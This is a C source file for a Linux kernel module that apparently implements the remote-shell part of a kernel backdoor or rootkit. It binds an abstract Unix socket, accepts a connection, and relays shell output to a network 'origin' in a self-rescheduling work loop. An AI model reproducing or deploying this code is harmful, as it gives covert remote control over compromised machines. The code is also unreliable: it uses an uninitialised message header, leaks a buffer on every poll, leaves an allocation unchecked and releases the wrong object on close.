#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/un.h>
#include <net/net_namespace.h>
#include <net/sock.h>

#include "headers/networking.h"
#include "headers/shell.h"

#define SOCK_PATH ("\0test-file2")
#define SOCK_PATH_LEN (sizeof(SOCK_PATH))
#define SOCK_DEV_MTU 2048

// According to the following post
// https://stackoverflow.com/questions/19937598/linux-kernel-module-unix-domain-sockets
// There is a bug with the kernel that incorrectly sets a byte after the struct sockaddr_un
// which can corrupt memory, so this struct should be safe against it.
struct safe_sockaddr_un {
    struct sockaddr_un addr;
    char padding[1];
};

struct stream_data {
    struct socket *sock;
    struct work_struct work;
    struct open_stream *st;
};

static void poll_shell_work(struct work_struct *work) {
    struct stream_data *data = container_of(work, struct stream_data, work);
    struct msghdr msg;
    char *buff;
    int res;
    struct kvec iov = {
        .iov_len = SOCK_DEV_MTU
    };

    buff = kmalloc(SOCK_DEV_MTU, GFP_KERNEL);
    if (!buff) goto done;

    iov.iov_base = buff;

    res = kernel_recvmsg(data->sock, &msg, &iov, 1, SOCK_DEV_MTU, MSG_DONTWAIT);
    if (res < 0) {
        if (res != -11) {
            printk("Error receiving from unix sock - %d\n", res);
        }
    } else {
        res = send_response(data->st->origin, buff, res);
    }
    if (res) {
        printk("Error sending out - %d\n", res);
    }

done:  
    schedule_work(&data->work);
}



int open_shell(struct open_stream *st) {
    struct socket *srvsock = NULL;
    struct safe_sockaddr_un saddr;
    struct stream_data *data;
    int res;

    if ((res = sock_create_kern(&init_net, AF_UNIX, SOCK_SEQPACKET, 0, &srvsock))) {
        return 1;
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.addr.sun_family = AF_UNIX;
    memcpy(saddr.addr.sun_path, SOCK_PATH,  min(SOCK_PATH_LEN, sizeof(saddr.addr.sun_path) - 1));
    
    if ((res = kernel_bind(srvsock, (struct sockaddr *)&saddr.addr, sizeof(saddr.addr)))) {
        printk(KERN_INFO "Couldn't bind to addr\n");
        goto done;
    }
    printk(KERN_INFO "Bound to addr\n");

    if ((res = kernel_listen(srvsock, 1))) {
        goto done;
    }

    data = kmalloc(sizeof(struct stream_data), GFP_KERNEL);

    res = kernel_accept(srvsock, &data->sock, 0);

    INIT_WORK(&data->work, poll_shell_work);
    st->data = data;
    data->st = st;

    schedule_work(&data->work);

done:
    sock_release(srvsock);
    return res;
}

int recv_shell(struct open_stream *st, char *buff, size_t len) {
    int ret;
    struct socket *sock = ((struct stream_data *)st->data)->sock;
    struct msghdr msg = {
        .msg_name = NULL,
        .msg_control = NULL
    };
    struct kvec iov = {
        .iov_base = buff,
        .iov_len = len
    };

    if ((ret = kernel_sendmsg(sock, &msg, &iov, 1, len)) < 0) {
        return 1;
    }

    return 0;
}

int close_shell(struct open_stream *st) {
    if (st->data) {
        sock_release((struct socket *)st->data);
    }
    kfree(st->data);
    return 0;
}
